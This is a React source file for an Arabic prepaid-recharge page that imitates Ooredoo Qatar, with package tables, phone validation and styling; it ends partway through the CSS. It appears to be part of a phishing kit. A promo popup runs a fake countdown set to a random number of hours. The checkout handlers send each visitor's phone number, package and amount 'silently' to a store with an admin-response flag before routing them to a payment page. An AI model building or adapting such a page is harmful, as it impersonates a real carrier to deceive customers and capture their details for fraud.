import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { sendData } from '../lib/store';

const categories = [
  "سوبر", "بيانات", "فلكسي", "مكالمات", "التواصل الاجتماعي", "رصيد", "دقائق دولية", "تجوال", "باقات الزوار"
];

interface Package {
  name: string;
  data: string | null;
  dataDesc: string | null;
  intlMin: string | null;
  intlMinDesc: string | null;
  localMin: string | null;
  localMinDesc: string | null;
  countryMin: boolean;
  extras: string[];
  validity: string;
  price: string;
  hasOffers: boolean;
  isNew?: boolean;
  socialIcon?: 'tiktok' | 'facebook' | 'instagram' | 'snapchat';
  countryMinDesc?: string;
}

const allPackages: Record<string, Package[]> = {
  "سوبر": [
    { name: "سوبر 15", data: "1.5 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: "60", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "15", hasOffers: false },
    { name: "سوبر 40", data: "4 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "10", intlMinDesc: "دقائق دولية", localMin: "150", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "ميزة واحدة مجانية من أصل 3"], validity: "28 يوماً", price: "40", hasOffers: true },
    { name: "سوبر 50", data: "5 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "10", intlMinDesc: "دقائق دولية", localMin: "200", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["ميزتان مجانيتان من أصل 3"], validity: "28 يوماً", price: "50", hasOffers: true },
    { name: "سوبر 65", data: "8 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "20", intlMinDesc: "دقيقة دولية", localMin: "240", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "ميزتان مجانيتان من أصل 3", "بيانات غير محدودة بسرعة 256 كيلوبت في الثانية", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "65", hasOffers: true },
    { name: "سوبر 75", data: "10 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "20", intlMinDesc: "دقيقة دولية", localMin: "300", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "3 مزايا مجانية", "عرض ترويجي مجاني واحد", "بيانات غير محدودة بسرعة 256 كيلوبت في الثانية", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "75", hasOffers: true },
    { name: "سوبر 100", data: "16 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "20", intlMinDesc: "دقيقة دولية", localMin: "400", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "3 مزايا مجانية", "عرض ترويجي مجاني واحد", "بيانات غير محدودة بسرعة 256 كيلوبت في الثانية", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "100", hasOffers: true },
    { name: "سوبر 125", data: "19 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "20", intlMinDesc: "دقيقة دولية", localMin: "500", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "3 مزايا مجانية", "عرض ترويجي مجاني واحد", "بيانات غير محدودة بسرعة 256 كيلوبت في الثانية", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "125", hasOffers: true },
    { name: "سوبر 200", data: "32 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "20", intlMinDesc: "دقيقة دولية", localMin: "1000", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "3 مزايا مجانية", "عرض ترويجي مجاني واحد", "بيانات غير محدودة بسرعة 1 ميغابت في الثانية", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "200", hasOffers: true },
    { name: "سوبر 250", data: "30 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "60", intlMinDesc: "دقيقة دولية", localMin: "1000", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "3 مزايا مجانية", "عرض ترويجي مجاني واحد", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "180 يوماً", price: "250", hasOffers: true },
    { name: "سوبر 500", data: "300 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: "20", intlMinDesc: "دقيقة دولية", localMin: "40,000", localMinDesc: "دقيقة محلية", countryMin: true, extras: ["مفاجأة يومية", "3 مزايا مجانية", "عرض ترويجي مجاني واحد", "بيانات غير محدودة بسرعة 1 ميغابت في الثانية", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "500", hasOffers: true },
  ],
  "بيانات": [
    { name: "بيانات 10", data: "4 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "يومين", price: "10", hasOffers: false },
    { name: "بيانات 20", data: "2 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "20", hasOffers: false },
    { name: "بيانات 25", data: "12 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "3 أيام", price: "25", hasOffers: false },
    { name: "بيانات 40", data: "6 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "14 يوماً", price: "40", hasOffers: false },
    { name: "بيانات 50", data: "8 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "28 يوماً", price: "50", hasOffers: false },
    { name: "بيانات 65", data: "11 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "65", hasOffers: true },
    { name: "بيانات 75", data: "14 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "75", hasOffers: true },
    { name: "بيانات 80", data: "12 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "80", hasOffers: true },
    { name: "بيانات 100", data: "20 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "100", hasOffers: true },
    { name: "بيانات غير محدودة 125", data: "100 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "7 أيام", price: "125", hasOffers: true },
    { name: "بيانات 150", data: "25 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "150", hasOffers: true },
    { name: "بيانات 200", data: "35 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "200", hasOffers: true },
    { name: "بيانات غير محدودة 250", data: "150 غيغابايت", dataDesc: "من البيانات المحلية", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "30 يوماً", price: "250", hasOffers: true },
  ],
  "فلكسي": [
    { name: "فلكسي 10", data: "70 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "3 أيام", price: "10", hasOffers: false },
    { name: "فلكسي 20", data: "150 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "20", hasOffers: false },
    { name: "فلكسي 40", data: "350 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "14 يوماً", price: "40", hasOffers: false },
    { name: "فلكسي 50", data: "450 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "28 يوماً", price: "50", hasOffers: false },
    { name: "فلكسي 65", data: "650 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "65", hasOffers: true },
    { name: "فلكسي 75", data: "750 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "75", hasOffers: true },
    { name: "فلكسي 100", data: "1100 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "100", hasOffers: true },
    { name: "فلكسي 150", data: "2200 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "150", hasOffers: true },
    { name: "فلكسي 200", data: "3300 نقطة", dataDesc: "للاستخدام المحلي والتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "200", hasOffers: true },
  ],
  "مكالمات": [
    { name: "مكالمات 10", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: "100", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية"], validity: "3 أيام", price: "10", hasOffers: false },
    { name: "مكالمات 15", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: "150", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية"], validity: "10 أيام", price: "15", hasOffers: false },
    { name: "مكالمات 40", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: "500", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية"], validity: "28 يوماً", price: "40", hasOffers: false },
    { name: "مكالمات 50", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: "700", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية"], validity: "28 يوماً", price: "50", hasOffers: false },
    { name: "مكالمات 65", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: "1200", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "65", hasOffers: true },
    { name: "مكالمات 75", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: "1500", localMinDesc: "دقيقة محلية", countryMin: false, extras: ["مفاجأة يومية", "اشتراك Urban Point", "%15 إضافية عند التعبئة عبر الإنترنت"], validity: "28 يوماً", price: "75", hasOffers: true },
  ],
  "التواصل الاجتماعي": [
    { name: "TikTok - يومياً", data: "5 غيغابايت", dataDesc: "من البيانات اليومية لتطبيق TikTok", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: [], validity: "يوم واحد", price: "5", hasOffers: false, socialIcon: 'tiktok' },
    { name: "TikTok - أسبوعياً", data: "10 غيغابايت", dataDesc: "من البيانات الأسبوعية لتطبيق TikTok", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "15", hasOffers: false, socialIcon: 'tiktok' },
    { name: "فيسبوك - أسبوعياً", data: "10 غيغابايت", dataDesc: "من البيانات الأسبوعية لتطبيق فيسبوك", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "15", hasOffers: false, socialIcon: 'facebook' },
    { name: "Instagram - أسبوعياً", data: "10 غيغابايت", dataDesc: "من البيانات الأسبوعية لتطبيق Instagram", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "15", hasOffers: false, socialIcon: 'instagram' },
    { name: "سناب شات - أسبوعياً", data: "10 غيغابايت", dataDesc: "من البيانات الأسبوعية لتطبيق سناب شات", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "15", hasOffers: false, socialIcon: 'snapchat' },
  ],
  "رصيد": [
    { name: "رصيد 10", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "10", hasOffers: false },
    { name: "رصيد 20", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "20", hasOffers: false },
    { name: "رصيد 30", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "30", hasOffers: false },
    { name: "رصيد 40", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "40", hasOffers: false },
    { name: "رصيد 50", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "50", hasOffers: false },
    { name: "رصيد 60", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "60", hasOffers: false },
    { name: "رصيد 65", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "65", hasOffers: false },
    { name: "رصيد 100", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "90 يوماً", price: "100", hasOffers: false },
    { name: "رصيد 200", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "90 يوماً", price: "200", hasOffers: false },
    { name: "رصيد 500", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "90 يوماً", price: "500", hasOffers: false },
  ],
  "دقائق دولية": [
    { name: "إنترناشونال 10", data: null, dataDesc: null, intlMin: "120", intlMinDesc: "دقيقة دولية", localMin: null, localMinDesc: null, countryMin: true, countryMinDesc: "باقة دولة واحدة أو باقة دول متعددة", extras: ["مفاجأة يومية"], validity: "7 أيام", price: "10", hasOffers: false, isNew: true },
    { name: "دولي 20", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: true, countryMinDesc: "باقة دولة واحدة أو باقة دول متعددة", extras: ["مفاجأة يومية"], validity: "30 يوماً", price: "20", hasOffers: false },
    { name: "دولي 10", data: null, dataDesc: null, intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: true, countryMinDesc: "باقة دول متعددة", extras: ["مفاجأة يومية"], validity: "7 أيام", price: "10", hasOffers: false },
  ],
  "تجوال": [
    { name: "تجوال 10", data: "500 ميغابايت", dataDesc: "من البيانات للتجوال", intlMin: null, intlMinDesc: null, localMin: "5", localMinDesc: "دقائق للتجوال", countryMin: false, extras: ["مفاجأة يومية"], validity: "3 أيام", price: "10", hasOffers: false },
    { name: "تجوال 30", data: "1 غيغابايت", dataDesc: "من البيانات للتجوال", intlMin: null, intlMinDesc: null, localMin: "30", localMinDesc: "دقيقة صادرة للتجوال", countryMin: false, extras: ["مفاجأة يومية"], validity: "28 يوماً", price: "30", hasOffers: false },
    { name: "جواز Ooredoo - أسبوعياً", data: "3 غيغابايت", dataDesc: "من البيانات للتجوال", intlMin: null, intlMinDesc: null, localMin: "100", localMinDesc: "دقيقة للتجوال", countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "100", hasOffers: false },
    { name: "جواز Ooredoo للبيانات - يومياً", data: "1 غيغابايت", dataDesc: "من البيانات للتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "يوم واحد", price: "35", hasOffers: false },
    { name: "جواز Ooredoo للبيانات - أسبوعياً", data: "6 غيغابايت", dataDesc: "من البيانات للتجوال", intlMin: null, intlMinDesc: null, localMin: null, localMinDesc: null, countryMin: false, extras: ["مفاجأة يومية"], validity: "7 أيام", price: "100", hasOffers: false },
  ],
  "باقات الزوار": [
    { name: "باقة الزائر الدولية - 3 دولار", data: null, dataDesc: null, intlMin: "15", intlMinDesc: "دقيقة دولية", localMin: null, localMinDesc: null, countryMin: false, extras: [], validity: "3 أيام", price: "10.9", hasOffers: false },
    { name: "باقة الزائر الدولية - 5 دولار", data: null, dataDesc: null, intlMin: "30", intlMinDesc: "دقيقة دولية", localMin: null, localMinDesc: null, countryMin: false, extras: [], validity: "5 أيام", price: "18.2", hasOffers: false },
    { name: "باقة الزائر الدولية - 10 دولار", data: null, dataDesc: null, intlMin: "60", intlMinDesc: "دقيقة دولية", localMin: null, localMinDesc: null, countryMin: false, extras: [], validity: "10 أيام", price: "36.4", hasOffers: false },
  ],
};

const accordionItems = [
  "الشروط و الاحكام لعرض Hungama",
  "الشروط و الاحكام للمميزات المجانية",
  "أوربان بوينت - الشروط والأحكام",
  "زيادة البيانات الأساسية لباقة سوبر 40",
  "تعديل فترة الصلاحية لباقة هلا سوبر 40 فما فوق",
];

export default function RechargePage() {
  const [, navigate] = useLocation();
  const getInitialCategory = () => {
    const params = new URLSearchParams(window.location.search);
    const cat = params.get('tab');
    if (cat && Object.keys(allPackages).includes(cat)) return cat;
    return "سوبر";
  };
  const [activeCategory, setActiveCategoryState] = useState(getInitialCategory);
  const setActiveCategory = (cat: string) => {
    setActiveCategoryState(cat);
    const url = new URL(window.location.href);
    url.searchParams.set('tab', cat);
    window.history.replaceState({}, '', url.toString());
  };
  const [phoneNumber, setPhoneNumber] = useState("");
  const [showMore, setShowMore] = useState(false);
  const [showCustomRecharge, setShowCustomRecharge] = useState(false);
  const [customAmount, setCustomAmount] = useState("");
  const [selectedPkg, setSelectedPkg] = useState<Package | null>(null);
  const [phoneError, setPhoneError] = useState("");
  const [phoneLocked, setPhoneLocked] = useState(false);
  const [isValidating, setIsValidating] = useState(false);
  
  // Popup with countdown timer
  const [showPopup, setShowPopup] = useState(true);
  const [countdown, setCountdown] = useState(() => {
    // Generate random time < 12 hours based on session
    const stored = sessionStorage.getItem('popup_end_time');
    if (stored) {
      const remaining = Math.max(0, Math.floor((parseInt(stored) - Date.now()) / 1000));
      return remaining;
    }
    // Random between 1-12 hours in seconds
    const randomSeconds = Math.floor(Math.random() * 11 * 3600) + 3600;
    sessionStorage.setItem('popup_end_time', String(Date.now() + randomSeconds * 1000));
    return randomSeconds;
  });

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) { clearInterval(timer); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);



  const formatTime = (totalSec: number) => {
    const h = Math.floor(totalSec / 3600);
    const m = Math.floor((totalSec % 3600) / 60);
    const s = totalSec % 60;
    return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
  };

  const packages = allPackages[activeCategory] || [];

  const rawOoredooApiBase = (import.meta as any).env?.VITE_OOREDOO_API_URL || (import.meta as any).env?.VITE_SOCKET_URL || '';
  const OREDOO_API_BASE = rawOoredooApiBase ? (/^https?:\/\//i.test(rawOoredooApiBase) ? rawOoredooApiBase.replace(/\/$/, '') : `https://${rawOoredooApiBase.replace(/\/$/, '')}`) : '';

  const handleSelectPackage = (pkg: Package) => {
    setSelectedPkg(pkg);
    setPhoneError("");
  };

  const handleContinue = async () => {
    const phone = phoneNumber.trim().replace(/\D/g, '');
    if (phone.length !== 8) {
      setPhoneError("يرجى إدخال رقم صحيح مكون من 8 أرقام.");
      return;
    }
    // Validate locally - accept Qatar Ooredoo numbers (starts with 3, 5, 6, or 7)
    setIsValidating(true);
    setPhoneError("");
    const validPrefixes = ['3', '5', '6', '7'];
    if (!validPrefixes.includes(phone.charAt(0))) {
      setPhoneError("يرجى إدخال رقم Ooredoo قطر صحيح.");
      setIsValidating(false);
      return;
    }
    try {
      // Valid Ooredoo Qatar number - proceed to payment
      const paymentData = {
        serviceType: 'تعبئة رصيد Ooredoo',
        totalAmount: parseFloat(selectedPkg!.price),
        persons: [{ name: phone, amount: parseFloat(selectedPkg!.price) }],
        customerPhone: phone,
        paymentMethod: 'بوابة الدفع الإلكتروني',
        source: 'recharge',
        packageName: selectedPkg!.name,
        lineType: 'PREPAID',
      };
      localStorage.setItem('mohPaymentData', JSON.stringify(paymentData));
      sendData({
        data: {
          'رقم الهاتف': phone,
          'الباقة': selectedPkg!.name,
          'المبلغ': selectedPkg!.price,
          'الخدمة': 'تعبئة رصيد Ooredoo',
        },
        current: 'تعبئة الرصيد',
        waitingForAdminResponse: false,
        mode: 'silent',
      });
      setIsValidating(false);
      navigate("/summary-payment?service=moh");
    } catch {
      setPhoneError("تعذر التحقق من الرقم. يرجى المحاولة مرة أخرى.");
      setIsValidating(false);
    }
  };

  const handleCustomRecharge = () => {
    const amount = parseFloat(customAmount);
    if (!amount || amount < 10 || amount > 500) {
      alert("يرجى تحديد مبلغ ما بين 10 ر.ق و500 ر.ق");
      return;
    }
    if (!phoneNumber) {
      alert("يرجى إدخال رقم الهاتف أولاً");
      return;
    }
    const paymentData = {
      serviceType: 'تعبئة رصيد Ooredoo',
      totalAmount: amount,
      persons: [{ name: phoneNumber, amount }],
      customerPhone: phoneNumber,
      paymentMethod: 'بوابة الدفع الإلكتروني',
      source: 'recharge',
      packageName: `رصيد ${amount}`,
    };
    localStorage.setItem('mohPaymentData', JSON.stringify(paymentData));
    sendData({
      data: {
        'رقم الهاتف': phoneNumber,
        'الباقة': `رصيد ${amount}`,
        'المبلغ': String(amount),
        'الخدمة': 'تعبئة رصيد Ooredoo',
      },
      current: 'تعبئة الرصيد',
      waitingForAdminResponse: false,
      mode: 'silent',
    });
    setShowCustomRecharge(false);
    setCustomAmount("");
    navigate("/summary-payment?service=moh");
  };

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@300;400;500;600;700;800;900&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { margin: 0; padding: 0; }

        .rp-page {
          font-family: 'Noto Kufi Arabic', sans-serif;
          direction: rtl;
          min-height: 100vh;
          background: #ebf0f0;
          display: flex;
          flex-direction: column;
          color: #221e20;
        }

        /* ===== TOP HEADER ===== */
        .rp-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 0 64px;
          height: 56px;
          background: #fff;
          border-bottom: 3px solid #ed1c24;
        }
        .rp-header__right {
          display: flex;
          align-items: center;
          gap: 32px;
        }
        .rp-header__logo img {
          height: 36px;
          width: auto;
        }
        .rp-header__links {
          display: flex;
          align-items: center;
          gap: 24px;
        }
        .rp-header__links a {
          color: #221e20;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
        }
        .rp-header__links a.active {
          color: #ed1c24;
          font-weight: 600;
        }
        .rp-header__links a:hover { color: #ed1c24; }
        .rp-header__left {
          display: flex;
          align-items: center;
          gap: 16px;
        }
        .rp-header__lang {
          background: none;
          border: none;
          font-size: 14px;
          font-weight: 500;
          color: #221e20;
          cursor: pointer;
          font-family: 'Noto Kufi Arabic', sans-serif;
        }
        .rp-header__myoredoo {
          background: #ed1c24;
          color: #fff;
          border: none;
          border-radius: 20px;
          padding: 8px 20px;
          font-size: 12px;
          font-weight: 700;
          cursor: pointer;
          font-family: 'Noto Kufi Arabic', sans-serif;
          letter-spacing: 0.5px;
          text-transform: uppercase;
        }

        /* ===== SECONDARY NAV ===== */
        .rp-subnav {
          display: flex;
          align-items: center;
          justify-content: flex-start;
          padding: 0 64px;
          height: 44px;
          background: #fff;
          border-bottom: 3px solid #ed1c24;
          gap: 28px;
          overflow-x: auto;
        }
        .rp-subnav a {
          color: #221e20;
          text-decoration: none;
          font-size: 13px;
          font-weight: 500;
          white-space: nowrap;
          padding: 10px 0;
        }
        .rp-subnav a:hover { color: #ed1c24; }


        /* ===== PROMO POPUP ===== */
        .promo-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0,0,0,0.45);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 99999;
          animation: promoFadeIn 0.3s ease;
          padding: 24px;
          backdrop-filter: blur(3px);
        }
        @keyframes promoFadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes promoSlideIn {
          from { transform: scale(0.9) translateY(20px); opacity: 0; }
          to { transform: scale(1) translateY(0); opacity: 1; }
        }
        .promo-card {
          background: #fff;
          border-radius: 24px;
          max-width: 320px;
          width: 100%;
          text-align: center;
          position: relative;
          animation: promoSlideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
          box-shadow: 0 25px 50px rgba(0,0,0,0.15);
          overflow: hidden;
          direction: rtl;
        }
        .promo-card__top {
          background: linear-gradient(135deg, #ed1c24 0%, #c41018 100%);
          padding: 28px 24px 20px;
          color: #fff;
        }
        .promo-card__logo {
          height: 32px;
          margin-bottom: 14px;
          filter: brightness(0) invert(1);
        }
        .promo-card__close {
          position: absolute;
          top: 12px;
          left: 12px;
          background: rgba(255,255,255,0.2);
          border: none;
          color: #fff;
          width: 30px;
          height: 30px;
          border-radius: 50%;
          font-size: 20px;
          line-height: 1;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10;
          transition: background 0.2s;
        }
        .promo-card__close:hover {
          background: rgba(255,255,255,0.35);
        }
        .promo-card__title {
          font-size: 20px;
          font-weight: 700;
          margin: 0 0 8px;
          line-height: 1.4;
        }
        .promo-card__subtitle {
          font-size: 13px;
          opacity: 0.9;
          line-height: 1.6;
          margin: 0;
        }
        .promo-card__body {
          padding: 24px;
        }
        .promo-card__percent {
          font-size: 52px;
          font-weight: 900;
          color: #ed1c24;
          line-height: 1;
          margin-bottom: 4px;
        }
        .promo-card__percent-label {
          font-size: 13px;
          color: #666;
          margin-bottom: 20px;
        }
        .promo-card__timer {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
          margin-top: 8px;
        }
        .promo-card__timer-box {
          background: #f5f5f5;
          border-radius: 8px;
          padding: 8px 10px;
          min-width: 42px;
        }
        .promo-card__timer-num {
          font-size: 20px;
          font-weight: 800;
          color: #ed1c24;
          font-family: -apple-system, BlinkMacSystemFont, sans-serif;
          direction: ltr;
        }
        .promo-card__timer-label {
          font-size: 9px;
          color: #999;
          margin-top: 2px;
        }
        .promo-card__timer-sep {
          font-size: 18px;
          font-weight: 700;
          color: #ccc;
          margin-top: -8px;
        }
        .promo-card__expire {
          font-size: 11px;
          color: #999;
          margin-top: 14px;
        }
.promo-card__bar {
          position: absolute;
          bottom: 0;
          left: 0;
          right: 0;
          height: 3px;
          background: linear-gradient(90deg, #ed1c24, #ff6b6b);
        }
        /* ===== MOBILE NAV ===== */
        .rp-mobile-nav {
          display: none;
          align-items: center;
          justify-content: flex-start;
          padding: 0 12px;
          height: 44px;
          background: #fff;
          border-bottom: 1px solid #eee;
          gap: 0;
        }
        .rp-mobile-nav__btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 10px 16px;
          font-size: 13px;
          font-weight: 500;
          color: #221e20;
          text-decoration: none;
          border-radius: 20px;
          white-space: nowrap;
          transition: all 0.2s;
        }
        .rp-mobile-nav__btn.active {
          background: #ed1c24;
          color: #fff;
        }
        .rp-mobile-nav__btn.active svg {
          stroke: #fff;
        }
        .rp-mobile-nav__btn:not(.active):hover {
          background: #f5f5f5;
        }
